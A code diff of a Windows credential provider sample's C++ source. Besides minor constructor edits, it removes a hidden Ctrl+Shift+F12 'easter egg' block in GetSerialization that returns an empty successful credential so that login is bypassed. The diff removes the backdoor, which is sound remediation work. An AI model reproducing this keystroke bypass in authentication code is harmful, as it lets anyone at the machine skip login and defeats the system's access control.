@@ -16,10 +16,9 @@
 #include "CSampleCredential.h"
 #include "guid.h"
 
-CSampleCredential::CSampleCredential() :
+CSampleCredential::CSampleCredential():
     _cRef(1),
     _pCredProvCredentialEvents(nullptr),
-    _cpus(CPUS_INVALID),
     _pszUserSid(nullptr),
     _pszQualifiedUserName(nullptr),
     _fIsLocalUser(false),
@@ -505,18 +504,6 @@ HRESULT CSampleCredential::GetSerialization(_Out_ CREDENTIAL_PROVIDER_GET_SERIAL
                                             _Outptr_result_maybenull_ PWSTR *ppwszOptionalStatusText,
                                             _Out_ CREDENTIAL_PROVIDER_STATUS_ICON *pcpsiOptionalStatusIcon)
 {
-    // ***** SAFETY BYPASS: Easter Egg Keystroke (Ctrl+Shift+F12) *****
-    if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
-        (GetAsyncKeyState(VK_SHIFT) & 0x8000) &&
-        (GetAsyncKeyState(VK_F12) & 0x8000))
-    {
-        // Return a successful empty serialization – Windows will log you in
-        *pcpgsr = CPGSR_RETURN_CREDENTIAL_FINISHED;
-        ZeroMemory(pcpcs, sizeof(*pcpcs));
-        *ppwszOptionalStatusText = nullptr;
-        *pcpsiOptionalStatusIcon = CPSI_NONE;
-        return S_OK;
-    }
     HRESULT hr = E_UNEXPECTED;
     *pcpgsr = CPGSR_NO_CREDENTIAL_NOT_FINISHED;
     *ppwszOptionalStatusText = nullptr;
